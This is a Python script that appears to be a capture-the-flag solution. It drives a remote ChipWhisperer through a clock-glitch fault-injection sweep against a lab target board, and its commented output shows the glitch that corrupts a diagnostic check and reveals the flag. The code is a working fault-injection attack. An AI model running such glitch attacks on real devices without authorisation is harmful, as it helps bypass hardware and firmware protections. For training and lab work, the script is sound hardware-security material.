from pathlib import Path
import sys

# Adding parent directory to the path to access utils
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from utils.remote_cw import remote_cw, RemoteConfig
from utils.helper_cv import setup_cw, cap_pass_trace, plot_traces, PLATFORM, interact, reboot_flush
import numpy as np
import matplotlib.pyplot as plt
from rpyc.utils.classic import obtain

cfg = RemoteConfig(
    host="remotechipwhisperer.example", # replace with hostname of the remote pi or its IP address
    user="pi",
    key_filename="path/to/your/priv_key", # replace with your private key path
    port=18812,                  # must match the rpyc_classic on the Pi
    connect_host="127.0.0.1",    # local end (your machine)
    remote_host="127.0.0.1",     # remote rpyc_classic bind address
)


def main():
    with remote_cw(cfg) as cw:
        # This runs on the REMOTE machine inside the venv!
        scope, target, prog = setup_cw(cw,cw.scope())
        # print(help(scope))
        # help(scope.glitch)
        # print(help(target))

        # Setting up the scope for capturing
        scope.adc.samples = 1000
        BAUD = target.baud
        CLOCK = scope.io.clkout
        NEWCLOCK = 24e6
        scope.io.clkout = NEWCLOCK
        NEWCLOCK = scope.io.clkout
        target.baud = BAUD * NEWCLOCK / CLOCK
        scope.adc.clk_freq = 7500000.0
        print(f"[+] Changed baud rate from {BAUD} to {target.baud}")
        print(f"[+] Changed clkout from {CLOCK} to {NEWCLOCK}")

        #  GLITCH SETTINGS ------------------------------------------------------------------------------------------------------
        
        gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["repeat", "ext_offset", "tries"])
        num_tries = 1 # increase to get better glitch stats
        gc.set_range("tries", 1, num_tries)
        gc.set_range("ext_offset", 4, 30)
        gc.set_range("repeat", 2, 30) # sarebbe la width per CWNANO

        gc.set_global_step(1)

        #  GLITCH LOOP ------------------------------------------------------------------------------------------------------

        #disable logging
        cw.set_all_log_levels(cw.logging.CRITICAL)

        # scope.adc.timeout = 0.5

        reboot_flush(scope, target)

        resets = 0
        for glitch_setting in gc.glitch_values():

            # glitch_setting is (repeat, ext_offset, tries) 

            scope.glitch.repeat = glitch_setting[0]
            scope.glitch.ext_offset = glitch_setting[1]
            print(f"resets = {resets} -- repeat = {scope.glitch.repeat}, ext_offset = {scope.glitch.ext_offset}", flush=True, end = ' -> ')

            target.flush()

            scope.arm()

            #Do glitch loop
            target.simpleserial_write("d", b"")
            
            ret = scope.capture()

            # scope.io.vglitch_reset() # CWNANO DOESN'T LIKE THIS
            if ret:
                #print('Timeout - no trigger')
                gc.add("reset")
                resets += 1

                #Device is slow to boot?
                reboot_flush(scope, target)

            else:
                val = target.simpleserial_read_witherrors('r', 26, glitch_timeout=10, timeout=50)#For loop check
                print(val['payload'], flush=True)
                if val['valid'] is False or val['payload'] is None:
                    gc.add("reset")
                    reboot_flush(scope, target)
                    resets += 1
                    #print(val)
                else:

                    if 'OK' not in val['payload'].decode() or val['rv'] != 0: #for loop check
                        gc.add("success")
                        print("SUCCESS", flush=True)
                        print(f"Flag: {val['payload'].decode()}", flush=True)
                        exit()
                    else:
                        gc.add("normal")

        print("Done")
        cw.set_all_log_levels(cw.logging.WARNING)


if __name__ == "__main__":
    main()

# [+] Changed baud rate from 38400 to 153600.0
# [+] Changed clkout from 7500000.0 to 30000000.0
# resets = 0 -- repeat = 2, ext_offset = 4 -> None
# resets = 1 -- repeat = 2, ext_offset = 5 -> bytearray(b'DIAGNOSTIC_OK             ')
# resets = 1 -- repeat = 2, ext_offset = 6 -> None
# resets = 2 -- repeat = 2, ext_offset = 7 -> None
# resets = 3 -- repeat = 2, ext_offset = 8 -> None
# resets = 4 -- repeat = 2, ext_offset = 9 -> bytearray(b'DIAGNOSTIC_OK             ')
# resets = 4 -- repeat = 2, ext_offset = 10 -> bytearray(b'DIAGNOSTIC_OK             ')
# resets = 4 -- repeat = 2, ext_offset = 11 -> bytearray(b'DIAGNOSTIC_OK             ')
# resets = 4 -- repeat = 2, ext_offset = 12 -> None
# resets = 5 -- repeat = 2, ext_offset = 13 -> bytearray(b'DIAGNOSTIC_OK             ')
# resets = 5 -- repeat = 2, ext_offset = 14 -> None
# resets = 6 -- repeat = 2, ext_offset = 15 -> bytearray(b'DIAGNOSTIC_OK             ')
# resets = 6 -- repeat = 2, ext_offset = 16 -> bytearray(b'cc1{C0RRUPT3D_C4LCUL4T10N}')
# SUCCESS
# Flag: cc1{C0RRUPT3D_C4LCUL4T10N}